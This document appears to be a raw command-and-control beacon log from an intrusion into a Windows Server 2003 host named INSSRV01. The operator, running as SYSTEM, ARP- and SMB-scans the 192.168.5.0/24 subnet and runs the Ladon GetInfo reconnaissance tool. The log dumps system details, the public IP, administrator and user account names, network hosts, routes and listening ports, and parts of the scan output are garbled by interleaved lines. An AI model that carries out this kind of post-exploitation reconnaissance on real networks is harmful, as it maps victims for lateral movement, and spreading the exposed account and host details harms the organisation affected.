+02/04 10:25:45 UTC [input] <karson> portscan 192.168.5.0-192.168.5.255 445 arp 1024
+02/04 10:25:45 UTC [task] <T1046, T1093> Tasked beacon to scan ports 445 on 192.168.5.0-192.168.5.255
+02/04 10:25:45 UTC [checkin] host called home, sent: 75365 bytes
+02/04 10:25:47 UTC [output]
+received output:
+(ARP) Target '192.168.5.1' is alive. 90-6C-AC-E2-EC-D9
+(ARP) Target '192.168.5.15' is alive. 00-21-97-68-CB-01
+(ARP) Target '192.168.5.5' is alive. (ARP) Target '192.168.5.12' is alive. (ARP) Target '192.168.5.8' is alive. 8C(ARP) Target '192.168.5.7' is alive. 0000-74--E7-0B0C-27--48-8229-EA--10-BD2F-5C--96-1ED0-8F--1E-89EC
+38
+
+
+(ARP) Target '192.168.5.13' is alive. (ARP) Target '192.168.5.9' is alive. (ARP) Target '192.168.5.17' is alive. 00(ARP) Target '192.168.5.16' is alive. (ARP) Target '192.168.5.18' is alive. (ARP) Target '192.168.5.20' is alive. 0000-000000--0C---0C0C-0C0C0C--29---2929-292929--59---280D-B5EB53--64---502F-C419A4--B9---425E
+939417
+
+(ARP) Target '192.168.5.31' is alive. (ARP) Target '192.168.5.19' is alive. (ARP) Target '192.168.5.25' is alive. 
+(ARP) Target '192.168.5.30' is alive. (ARP) Target '192.168.5.28' is alive. (ARP) Target '192.168.5.14' is alive. 
+
+B4F400B4EC00------7A4D0C7AA80C------F13029F16B29------A8E0F7A8A126------AE87BCAE550C------839F35820137
+
+
+
+
+
+(ARP) Target '192.168.5.22' is alive. 00-0C-29-DF-8E-7C
+(ARP) Target '192.168.5.21' is alive. 78-8C-77-0E-36-6C
+(ARP) Target '192.168.5.40' is alive. (ARP) Target '192.168.5.45' is alive. (ARP) Target '192.168.5.46' is alive. 005CEC---0CD9EB---2998B8---25F69D---00A461---179EEA
+
+
+(ARP) Target '192.168.5.35' is alive. (ARP) Target '192.168.5.50' is alive. 00EC--0CA8--296B--5DA2--176A--F378
+
+(ARP) Target '192.168.5.51' is alive. 00-0C-29-7F-88-B0
+(ARP) Target '192.168.5.55' is alive. 5C-ED-8C-A0-D6-BD
+(ARP) Target '192.168.5.56' is alive. (ARP) Target '192.168.5.53' is alive. (ARP) Target '192.168.5.54' is alive. 000000---0C0C0C---292929---2C11F7---8C61DE---3AC0A8
+
+
+(ARP) Target '192.168.5.52' is alive. 44-6D-57-F7-66-A2
+(ARP) Target '192.168.5.63' is alive. 00-0C-29-1A-32-0B
+(ARP) Target '192.168.5.60' is alive. 44-39-C4-54-86-85
+(ARP) Target '192.168.5.73' is alive. (ARP) Target '192.168.5.65' is alive. (ARP) Target '192.168.5.79' is alive. 000000---0C0C0C---292929---AB9417---A10353---258777
+
+
+(ARP) Target '192.168.5.87' is alive. (ARP) Target '192.168.5.85' is alive. (ARP) Target '192.168.5.61' is alive. (ARP) Target '192.168.5.86' is alive. 00(ARP) Target '192.168.5.64' is alive. (ARP) Target '192.168.5.74' is alive. 000000-0000---0C--0C0C0C-0C0C---29--292929-2929---F3--65539C-FD9B---DE--86F4F7-E401---73--9DEDCC
+28CF
+
+
+
+
+(ARP) Target '192.168.5.70' is alive. 00-0C-29-25-54-95
+(ARP) Target '192.168.5.89' is alive. (ARP) Target '192.168.5.88' is alive. 0000--0C0C--2929--0FB0--4A49--9732
+
+(ARP) Target '192.168.5.94' is alive. (ARP) Target '192.168.5.97' is alive. 0000--0C0C--2929--7FEC--3036--2771
+
+(ARP) Target '192.168.5.96' is alive. (ARP) Target '192.168.5.90' is alive. (ARP) Target '192.168.5.98' is alive. (ARP) Target '192.168.5.101' is alive. (ARP) Target '192.168.5.103' is alive. 0000000000-----0C0C0C0B0B-----2929298282-----48F001BBBB-----9BB97BD9D9-----72F7052C34
+
+
+
+
+(ARP) Target '192.168.5.95' is alive. 00-0C-29-A4-DD-64
+(ARP) Target '192.168.5.102' is alive. 80-2A-A8-13-3B-72
+
+
+02/04 10:25:49 UTC [output]
+received output:
+(ARP) Target '192.168.5.107' is alive. 00-11-32-2F-A5-33
+(ARP) Target '192.168.5.108' is alive. 90-09-D0-09-06-21
+(ARP) Target '192.168.5.109' is alive. 00-11-32-E9-DA-57
+(ARP) Target '192.168.5.106' is alive. 80-2A-A8-13-3B-C4
+(ARP) Target '192.168.5.105' is alive. E0-BB-9E-FC-91-C4
+(ARP) Target '192.168.5.113' is alive. (ARP) Target '192.168.5.114' is alive. 00F4--0B4D--8230--A3E1--455D--8E83
+
+(ARP) Target '192.168.5.118' is alive. 00-15-5D-05-DE-08
+(ARP) Target '192.168.5.120' is alive. (ARP) Target '192.168.5.123' is alive. 00(ARP) Target '192.168.5.132' is alive. 00-5C--0B0CED---82298C---BBD322---D9D3FF---336E0C
+
+
+(ARP) Target '192.168.5.138' is alive. C0-3F-D5-B3-52-41
+(ARP) Target '192.168.5.145' is alive. C0-3F-D5-FA-32-47
+(ARP) Target '192.168.5.135' is alive. (ARP) Target '192.168.5.134' is alive. F400--4D0C--3029--E16C--6028--E5FB
+
+(ARP) Target '192.168.5.122' is alive. 44-D2-44-48-21-20
+(ARP) Target '192.168.5.127' is alive. D4-67-D3-D0-CD-F1
+(ARP) Target '192.168.5.128' is alive. 00-15-5D-05-DE-07
+(ARP) Target '192.168.5.154' is alive. 00-0B-82-BB-D9-27
+
+
+02/04 10:25:50 UTC [output]
+received output:
+(ARP) Target '192.168.5.161' is alive. 00-0C-29-18-23-01
+(ARP) Target '192.168.5.170' is alive. 98-4B-E1-6F-E9-E2
+(ARP) Target '192.168.5.178' is alive. 04-32-01-9D-D1-76
+(ARP) Target '192.168.5.187' is alive. (ARP) Target '192.168.5.186' is alive. C000--3F0C--D529--F54B--8967--637E
+
+(ARP) Target '192.168.5.183' is alive. (ARP) Target '192.168.5.179' is alive. 00B0--0B22--827A--BB2F--D928--29D4
+
+(ARP) Target '192.168.5.177' is alive. (ARP) Target '192.168.5.184' is alive. (ARP) Target '192.168.5.195' is alive. B49C00---757B0C---0EEF29---50B78C---793B82---D440B5
+
+
+(ARP) Target '192.168.5.196' is alive. B0-22-7A-2F-28-31
+(ARP) Target '192.168.5.201' is alive. 00-17-61-12-4C-A6
+
+
+02/04 10:25:51 UTC [output]
+received output:
+(ARP) Target '192.168.5.211' is alive. 94-C6-91-9A-7F-F1
+(ARP) Target '192.168.5.222' is alive. 00-0C-29-46-AE-CB
+(ARP) Target '192.168.5.215' is alive. (ARP) Target '192.168.5.227' is alive. (ARP) Target '192.168.5.219' is alive. (ARP) Target '192.168.5.228' is alive. 8400C000----69213F0C----935AD529----0DD4B343----418753F6----E56D9198
+
+
+
+(ARP) Target '192.168.5.236' is alive. E0-73-E7-C9-CE-51
+(ARP) Target '192.168.5.243' is alive. (ARP) Target '192.168.5.242' is alive. 0000--6A17--9361--F710--361C--77C9
+
+
+
+02/04 10:26:04 UTC [output]
+received output:
+192.168.5.7:445
+192.168.5.15:445 (platform: 500 version: 5.2 name: INSSRV01 domain: WORKGROUP)
+192.168.5.17:445
+192.168.5.19:445
+192.168.5.20:445
+192.168.5.25:445
+
+
+02/04 10:26:10 UTC [output]
+received output:
+192.168.5.28:445
+192.168.5.30:445
+192.168.5.31:445
+192.168.5.45:445
+192.168.5.46:445
+192.168.5.51:445
+192.168.5.52:445
+192.168.5.54:445
+192.168.5.55:445
+192.168.5.60:445
+192.168.5.63:445
+192.168.5.64:445
+192.168.5.70:445 (platform: 500 version: 5.2 name: GALERA2 domain: WORKGROUP)
+192.168.5.107:445
+
+
+02/04 10:26:11 UTC [output]
+received output:
+192.168.5.108:445
+192.168.5.109:445
+192.168.5.114:445
+192.168.5.118:445
+192.168.5.135:445
+192.168.5.138:445
+192.168.5.145:445
+192.168.5.161:445
+192.168.5.179:445
+192.168.5.184:445
+192.168.5.187:445
+192.168.5.195:445
+192.168.5.211:445
+192.168.5.215:445
+192.168.5.219:445
+192.168.5.227:445
+192.168.5.236:445
+Scanner module is complete
+
+
+02/04 10:29:06 UTC [output]
+9=========== SharpGetInfo（一键收集） ==========
+
+02/04 10:29:09 UTC [task] <T1093> Tasked beacon to run .NET program: Ladon.exe GetInfo
+02/04 10:29:10 UTC [checkin] host called home, sent: 484409 bytes
+02/04 10:29:12 UTC [output]
+received output:
+Ladon 9.1.1
+Start: 2024-02-04 18:30:16
+Runtime: .net 4.0  me: x86 OS: x86
+OS Name: Microsoft(R) Windows(R) Server 2003, Enterprise Edition
+Machine Make: Acer
+RunUser: SYSTEM PR: *IsSystem
+Priv: SeImpersonatePrivilege Enabled
+PID: 3388  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 23162 MB
+
+Load GetInfo
+Get Basic Info
+
+IPV4: 192.168.5.15
+
+
+02/04 10:29:14 UTC [output]
+received output:
+WanIP: 112.199.110.98
+
+
+02/04 10:29:14 UTC [output]
+received output:
+WanIP: 112.199.110.98
+
+
+02/04 10:29:16 UTC [output]
+received output:
+WanIP: 
+
+
+
+02/04 10:29:16 UTC [output]
+received output:
+PCname: INSSRV01
+GUID: ef900e8b-8414-40b8-9136-4c36c5d8c9b2
+
+
+02/04 10:29:18 UTC [output]
+received output:
+CPUID: BFEBFBFF0001067A
+DiskID: ST3250310AS
+
+
+02/04 10:29:19 UTC [output]
+received output:
+MAC: 00:21:97:68:CB:01
+
+
+Install Dotnet Version
+==============================================
+Error: C:\Windows\Microsoft.NET\Framework\v1.1.4322\MSBuild.exe
+
+Install PowerShell Version
+==============================================
+
+
+.Net Core Version
+
+
+
+02/04 10:29:23 UTC [output]
+received output:
+systeminfo:
+Host Name:                 INSSRV01
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Enterprise Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          INS Tech
+Registered Organization:   INS
+Product ID:                69713-640-8064163-45539
+Original Install Date:     7/8/2008, 2:51:58 PM
+System Up Time:            267 Days, 7 Hours, 28 Minutes, 16 Seconds
+System Manufacturer:       Acer
+System Model:              Veriton M670G/M670    
+System Type:               X86-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: x86 Family 6 Model 23 Stepping 10 GenuineIntel ~2999 Mhz
+                           [02]: x86 Family 6 Model 23 Stepping 10 GenuineIntel ~2999 Mhz
+BIOS Version:              ACRSYS - 20090320
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              N/A
+Time Zone:                 (GMT+08:00) Beijing, Chongqing, Hong Kong, Urumqi
+Total Physical Memory:     1,997 MB
+Available Physical Memory: 152 MB
+Page File: Max Size:       3,845 MB
+Page File: Available:      2,113 MB
+Page File: In Use:         1,732 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 563 Hotfix(s) Installed.
+                           [01]: File 1
+                           [02]: File 1
+                           [03]: File 1
+                           [04]: File 1
+                           [05]: File 1
+                           [06]: File 1
+                           [07]: File 1
+                           [08]: File 1
+                           [09]: File 1
+                           [10]: File 1
+                           [11]: File 1
+                           [12]: File 1
+                           [13]: File 1
+                           [14]: File 1
+                           [15]: File 1
+                           [16]: File 1
+                           [17]: File 1
+                           [18]: File 1
+                           [19]: File 1
+                           [20]: File 1
+                           [21]: File 1
+                           [22]: File 1
+                           [23]: File 1
+                           [24]: File 1
+                           [25]: File 1
+                           [26]: File 1
+                           [27]: File 1
+                           [28]: File 1
+                           [29]: File 1
+                           [30]: File 1
+                           [31]: File 1
+                           [32]: File 1
+                           [33]: File 1
+                           [34]: File 1
+                           [35]: File 1
+                           [36]: File 1
+                           [37]: File 1
+                           [38]: File 1
+                           [39]: File 1
+                           [40]: File 1
+                           [41]: File 1
+                           [42]: File 1
+                           [43]: File 1
+                           [44]: File 1
+                           [45]: File 1
+                           [46]: File 1
+                           [47]: File 1
+                           [48]: File 1
+                           [49]: File 1
+                           [50]: File 1
+                           [51]: File 1
+                           [52]: File 1
+                           [53]: File 1
+                           [54]: File 1
+                           [55]: File 1
+                           [56]: File 1
+                           [57]: File 1
+                           [58]: File 1
+                           [59]: File 1
+                           [60]: File 1
+                           [61]: File 1
+                           [62]: File 1
+                           [63]: File 1
+                           [64]: File 1
+                           [65]: File 1
+                           [66]: File 1
+                           [67]: File 1
+                           [68]: File 1
+                           [69]: File 1
+                           [70]: File 1
+                           [71]: File 1
+                           [72]: File 1
+                           [73]: File 1
+                           [74]: File 1
+                           [75]: File 1
+                           [76]: File 1
+                           [77]: File 1
+                           [78]: File 1
+                           [79]: File 1
+                           [80]: File 1
+                           [81]: File 1
+                           [82]: File 1
+                           [83]: File 1
+                           [84]: File 1
+                           [85]: File 1
+                           [86]: File 1
+                           [87]: File 1
+                           [88]: File 1
+                           [89]: File 1
+                           [90]: File 1
+                           [91]: File 1
+                           [92]: File 1
+                           [93]: File 1
+                           [94]: File 1
+                           [95]: File 1
+                           [96]: File 1
+                           [97]: File 1
+                           [98]: File 1
+                           [99]: File 1
+                           [100]: File 1
+                           [101]: File 1
+                           [102]: File 1
+                           [103]: File 1
+                           [104]: File 1
+                           [105]: File 1
+                           [106]: File 1
+                           [107]: File 1
+                           [108]: File 1
+                           [109]: File 1
+                           [110]: File 1
+                           [111]: File 1
+                           [112]: File 1
+                           [113]: File 1
+                           [114]: File 1
+                           [115]: File 1
+                           [116]: File 1
+                           [117]: File 1
+                           [118]: File 1
+                           [119]: File 1
+                           [120]: File 1
+                           [121]: File 1
+                           [122]: File 1
+                           [123]: File 1
+                           [124]: File 1
+                           [125]: File 1
+                           [126]: File 1
+                           [127]: File 1
+                           [128]: File 1
+                           [129]: File 1
+                           [130]: File 1
+                           [131]: File 1
+                           [132]: File 1
+                           [133]: File 1
+                           [134]: File 1
+                           [135]: File 1
+                           [136]: File 1
+                           [137]: File 1
+                           [138]: File 1
+                           [139]: File 1
+                           [140]: File 1
+                           [141]: File 1
+                           [142]: File 1
+                           [143]: File 1
+                           [144]: File 1
+                           [145]: File 1
+                           [146]: File 1
+                           [147]: File 1
+                           [148]: File 1
+                           [149]: File 1
+                           [150]: File 1
+                           [151]: File 1
+                           [152]: File 1
+                           [153]: File 1
+                           [154]: File 1
+                           [155]: File 1
+                           [156]: File 1
+                           [157]: File 1
+                           [158]: File 1
+                           [159]: File 1
+                           [160]: File 1
+                           [161]: File 1
+                           [162]: File 1
+                           [163]: File 1
+                           [164]: File 1
+                           [165]: File 1
+                           [166]: File 1
+                           [167]: File 1
+                           [168]: File 1
+                           [169]: File 1
+                           [170]: File 1
+                           [171]: File 1
+                           [172]: File 1
+                           [173]: File 1
+                           [174]: File 1
+                           [175]: File 1
+                           [176]: File 1
+                           [177]: File 1
+                           [178]: File 1
+                           [179]: File 1
+                           [180]: File 1
+                           [181]: File 1
+                           [182]: File 1
+                           [183]: File 1
+                           [184]: File 1
+                           [185]: File 1
+                           [186]: File 1
+                           [187]: File 1
+                           [188]: File 1
+                           [189]: File 1
+                           [190]: File 1
+                           [191]: File 1
+                           [192]: File 1
+                           [193]: File 1
+                           [194]: File 1
+                           [195]: File 1
+                           [196]: File 1
+                           [197]: File 1
+                           [198]: File 1
+                           [199]: File 1
+                           [200]: File 1
+                           [201]: File 1
+                           [202]: File 1
+                           [203]: File 1
+                           [204]: File 1
+                           [205]: File 1
+                           [206]: File 1
+                           [207]: File 1
+                           [208]: File 1
+                           [209]: File 1
+                           [210]: File 1
+                           [211]: File 1
+                           [212]: File 1
+                           [213]: File 1
+                           [214]: File 1
+                           [215]: File 1
+                           [216]: File 1
+                           [217]: File 1
+                           [218]: File 1
+                           [219]: File 1
+                           [220]: File 1
+                           [221]: File 1
+                           [222]: File 1
+                           [223]: File 1
+                           [224]: File 1
+                           [225]: File 1
+                           [226]: File 1
+                           [227]: File 1
+                           [228]: File 1
+                           [229]: File 1
+                           [230]: File 1
+                           [231]: File 1
+                           [232]: File 1
+                           [233]: File 1
+                           [234]: File 1
+                           [235]: File 1
+                           [236]: File 1
+                           [237]: File 1
+                           [238]: File 1
+                           [239]: File 1
+                           [240]: File 1
+                           [241]: File 1
+                           [242]: File 1
+                           [243]: File 1
+                           [244]: File 1
+                           [245]: File 1
+                           [246]: File 1
+                           [247]: File 1
+                           [248]: File 1
+                           [249]: File 1
+                           [250]: File 1
+                           [251]: File 1
+                           [252]: File 1
+                           [253]: File 1
+                           [254]: File 1
+                           [255]: File 1
+                           [256]: File 1
+                           [257]: File 1
+                           [258]: File 1
+                           [259]: File 1
+                           [260]: File 1
+                           [261]: File 1
+                           [262]: File 1
+                           [263]: File 1
+                           [264]: File 1
+                           [265]: File 1
+                           [266]: File 1
+                           [267]: File 1
+                           [268]: File 1
+                           [269]: File 1
+                           [270]: File 1
+                           [271]: File 1
+                           [272]: File 1
+                           [273]: File 1
+                           [274]: File 1
+                           [275]: File 1
+                           [276]: Q147222
+                           [277]: KB2416451 - QFE
+                           [278]: KB2572069 - QFE
+                           [279]: KB2604078 - QFE
+                           [280]: KB2656358 - QFE
+                           [281]: KB2656376 - QFE
+                           [282]: KB2656376-v2 - QFE
+                           [283]: KB2698032 - QFE
+                           [284]: KB933854 - QFE
+                           [285]: KB953298 - QFE
+                           [286]: KB979907 - QFE
+                           [287]: KB975558_WM8
+                           [288]: KB925398_WMP64
+                           [289]: KB2183461-IE8 - Update
+                           [2
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82567LM-3 Gigabit Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 192.168.5.15
+
+
+02/04 10:29:23 UTC [output]
+received output:
+
+Error: Could not load file or assembly '2 bytes loaded from Ladon, Version=9.1.1.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format.
+
+
+02/04 10:29:24 UTC [output]
+received output:
+cmdkey: 
+Currently stored credentials:
+
+ * NONE *
+ 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+    PortNumber    REG_DWORD    0xd3d
+
+
+
+02/04 10:29:26 UTC [output]
+received output:
+Wifi SSID:
+The following command was not found: wlan show profiles.
+
+
+02/04 10:29:27 UTC [output]
+received output:
+Current Wifi:
+The following command was not found: wlan show interfaces.
+Set:
+ALLUSERSPROFILE=C:\Documents and Settings\All Users
+CATALINA_HOME=C:\Program Files\Apache Software Foundation\Tomcat 5.5
+ClusterLog=C:\WINDOWS\Cluster\cluster.log
+CommonProgramFiles=C:\Program Files\Common Files
+COMPUTERNAME=INSSRV01
+ComSpec=C:\WINDOWS\system32\cmd.exe
+FP_NO_HOST_CHECK=NO
+GMATE_HOME=C:\GMateIE
+JAVA_HOME=C:\Program Files\Java\j2re1.4.2
+lib=C:\Program Files\SQLXML 4.0\bin\
+NUMBER_OF_PROCESSORS=2
+OPENSSL_CONF=C:\OpenSSL\bin\openssl.cfg
+OS=Windows_NT
+Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\Program Files\Microsoft SQL Server\80\Tools\Binn\;C:\Program Files\Microsoft SQL Server\90\DTS\Binn\;C:\Program Files\Microsoft SQL Server\90\Tools\binn\;C:\Program Files\Microsoft SQL Server\90\Tools\Binn\VSShell\Common7\IDE\;C:\Program Files\Microsoft Visual Studio 8\Common7\IDE\PrivateAssemblies\;C:\Program Files\Intel\DMIX
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+PROCESSOR_ARCHITECTURE=x86
+PROCESSOR_IDENTIFIER=x86 Family 6 Model 23 Stepping 10, GenuineIntel
+PROCESSOR_LEVEL=6
+PROCESSOR_REVISION=170a
+ProgramFiles=C:\Program Files
+PROMPT=$P$G
+SystemDrive=C:
+SystemRoot=C:\WINDOWS
+TEMP=C:\WINDOWS\system32\config\SYSTEM~1\LOCALS~1\Temp
+TMP=C:\WINDOWS\system32\config\SYSTEM~1\LOCALS~1\Temp
+USERDOMAIN=WORKGROUP
+USERNAME=INSSRV01$
+USERPROFILE=C:\WINDOWS\system32\config\systemprofile
+windir=C:\WINDOWS
+Get User Info
+
+
+02/04 10:29:27 UTC [output]
+received output:
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+admin
+admin01
+admin15
+devadmin
+Guest
+Help32
+jong
+ktnet
+ramel
+sqlagent
+tim
+The command completed successfully.
+User accounts for \\
+
+-------------------------------------------------------------------------------
+admin                    admin01                  admin15                  
+ASPNET                   devadmin                 dhlmanila                
+Guest                    Help32                   insnet                   
+IUSR_INSSRV01            IWAM_INSSRV01            jong                     
+ktnet                    PezaUser                 ramel                    
+sqlagent                 SUPPORT_388945a0         tim                      
+The command completed with one or more errors.
+
+Get IP Info
+
+
+02/04 10:29:27 UTC [output]
+received output:
+Windows IP Configuration
+
+
+
+   Host Name . . . . . . . . . . . . : INSSRV01
+
+   Primary Dns Suffix  . . . . . . . : 
+
+   Node Type . . . . . . . . . . . . : Unknown
+
+   IP Routing Enabled. . . . . . . . : Yes
+
+   WINS Proxy Enabled. . . . . . . . : Yes
+
+
+
+Ethernet adapter Local Area Connection:
+
+
+
+   Connection-specific DNS Suffix  . : 
+
+   Description . . . . . . . . . . . : Intel(R) 82567LM-3 Gigabit Network Connection
+
+   Physical Address. . . . . . . . . : 00-21-97-68-CB-01
+
+   DHCP Enabled. . . . . . . . . . . : No
+
+   IP Address. . . . . . . . . . . . : 192.168.5.15
+
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+
+   Default Gateway . . . . . . . . . : 192.168.5.1
+
+   DNS Servers . . . . . . . . . . . : 8.8.8.8
+
+
+02/04 10:29:27 UTC [output]
+received output:
+
+
+
+02/04 10:29:30 UTC [output]
+received output:
+Server Name            Remark
+
+-------------------------------------------------------------------------------
+\\ADMINISTRATOR                                                                
+\\DESKTOP-MJEJG5H                                                              
+\\DISKSTATION                                                                  
+\\GALERA2                                                                      
+\\INS-BACKUP                                                                   
+\\INS-BRY              INS-BRY                                                 
+\\INS-MICROSRV                                                                 
+\\INS-MIR                                                                      
+\\INS-MS-070                                                                   
+\\INS-PTSRVR-01                                                                
+\\INS-VS-002                                                                   
+\\INS-WS-005                                                                   
+\\INS-WS-008                                                                   
+\\INS-WS-022                                                                   
+\\INS-WS-025                                                                   
+\\INS-WS-026                                                                   
+\\INS-WS-030                                                                   
+\\INS-WS-038-ED                                                                
+\\INSLAB               INS HYPERV                                              
+\\INSSRV01                                                                     
+\\INTERCOM-MKTISE                                                              
+\\NASDRV01                                                                     
+\\NASDRV05                                                                     
+\\PBVIRTUALSRVR01                                                              
+\\TESTDEV01                                                                    
+\\VIRTUALSRV03                                                                 
+\\VM-JM                                                                        
+\\VMJONG               VMJONG                                                  
+\\VMSERVERSTAGING                                                              
+\\VMTESTDB             VMTESTDB                                                
+\\WIN-4KD1N5EN4UC                                                              
+\\WIN-6RAMU3PTLE3                                                              
+\\WIN-CQOQ9A1MPAI                                                              
+\\WIN-H403GAK9BUS                                                              
+The command completed successfully.
+
+
+02/04 10:29:30 UTC [output]
+received output:
+Interface: 192.168.5.15 --- 0x10003
+  Internet Address      Physical Address      Type
+  192.168.5.1           90-6c-ac-e2-ec-d9     dynamic   
+  192.168.5.7           74-27-ea-5c-8f-38     dynamic   
+  192.168.5.45          5c-d9-98-f6-a4-9e     dynamic   
+  192.168.5.102         80-2a-a8-13-3b-72     dynamic   
+  192.168.5.107         00-11-32-2f-a5-33     dynamic   
+  192.168.5.122         44-d2-44-48-21-20     dynamic   
+  192.168.5.145         c0-3f-d5-fa-32-47     dynamic   
+  192.168.5.177         b4-75-0e-50-79-d4     dynamic   
+  192.168.5.187         c0-3f-d5-f5-89-63     dynamic   
+  192.168.5.211         94-c6-91-9a-7f-f1     dynamic   
+  192.168.5.227         00-21-5a-d4-87-6d     dynamic   
+  192.168.5.243         00-6a-93-f7-36-77     dynamic
+IPv4 Route Table
+===========================================================================
+Interface List
+0x1 ........................... MS TCP Loopback interface
+0x10003 ...00 21 97 68 cb 01 ...... Intel(R) 82567LM-3 Gigabit Network Connection
+===========================================================================
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0      192.168.5.1     192.168.5.15     20
+        127.0.0.0        255.0.0.0        127.0.0.1        127.0.0.1      1
+      192.168.5.0    255.255.255.0     192.168.5.15     192.168.5.15     20
+     192.168.5.15  255.255.255.255        127.0.0.1        127.0.0.1     20
+    192.168.5.255  255.255.255.255     192.168.5.15     192.168.5.15     20
+        224.0.0.0        240.0.0.0     192.168.5.15     192.168.5.15     20
+  255.255.255.255  255.255.255.255     192.168.5.15     192.168.5.15      1
+Default Gateway:       192.168.5.1
+===========================================================================
+Persistent Routes:
+  None
+
+
+02/04 10:29:30 UTC [output]
+received output:
+netstat:
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:82             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:83             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:84             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:85             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:90             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       760
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:899            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       508
+  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       1056
+  TCP    0.0.0.0:1033           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1580
+  TCP    0.0.0.0:1723           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:2111           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2184           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2190           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2191           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2192           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2193           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2194           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2195           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2196           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2198           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2199           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       1636
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2632
+  TCP    0.0.0.0:5800           0.0.0.0:0              LISTENING       2140
+  TCP    0.0.0.0:5900           0.0.0.0:0              LISTENING       2140
+  TCP    0.0.0.0:8001           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8095           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8211           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9002           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9003           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9011           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9991           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9992           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:21535          0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:65535          0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:135          127.0.0.1:1621         ESTABLISHED     760
+  TCP    127.0.0.1:1025         127.0.0.1:1622         ESTABLISHED     508
+  TCP    127.0.0.1:1055         0.0.0.0:0              LISTENING       3052
+  TCP    127.0.0.1:1365         127.0.0.1:1433         ESTABLISHED     1760
+  TCP    127.0.0.1:1433         127.0.0.1:1365         ESTABLISHED     1580
+  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       1580
+  TCP    127.0.0.1:1621         127.0.0.1:135          ESTABLISHED     1580
+  TCP    127.0.0.1:1622         127.0.0.1:1025         ESTABLISHED     1580
+  TCP    127.0.0.1:2483         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:2484         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:3027         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:3030         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:3167         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:3168         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:5152         0.0.0.0:0              LISTENING       1416
+  TCP    127.0.0.1:21826        0.0.0.0:0              LISTENING       148
+  TCP    127.0.0.1:39487        0.0.0.0:0              LISTENING       148
+  TCP    192.168.5.15:80        192.168.5.1:6953       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:6999       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:8187       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:8191       CLOSE_WAIT      4
